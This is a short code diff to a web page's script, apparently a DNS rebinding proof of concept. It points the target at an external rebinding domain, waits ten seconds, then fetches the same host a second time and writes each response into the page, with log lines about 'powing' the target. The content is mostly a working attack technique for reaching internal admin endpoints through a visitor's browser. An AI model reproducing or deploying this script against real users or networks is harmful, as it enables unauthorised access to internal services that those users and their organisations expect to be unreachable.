@@ -27,19 +27,25 @@ function TargetURL() {
   document.write("[In function TargetURL\n]");
   var URL = window.location.hostname;
   URL = "https://" + URL + "/dns_rebinding/admin";
-  URL2 = "https://yakaiser.github.io"
+  URL2 = "http://plopper.cloudns.cl"
   document.write("[In function TargetURL: TargetURL is:]");
-  document.write(URL);
-  return URL;
+  document.write(URL2);
+  return URL2;
 }
 
 document.write("Starting powing");
 var URL1 = httpGet(TargetURL());
 document.write(URL1);
     
-document.write("Ending powing");
-sleep(3000);
-document.write("Slept");  
+document.write("Ending pownding");
+sleep(10000);
+document.write("Slept");
+
+document.write("Starting re-powing");
+var URL3 = httpGet(TargetURL());
+document.write(URL3);
+    
+document.write("Ending re-pownding");
 </script>
 
 </body>
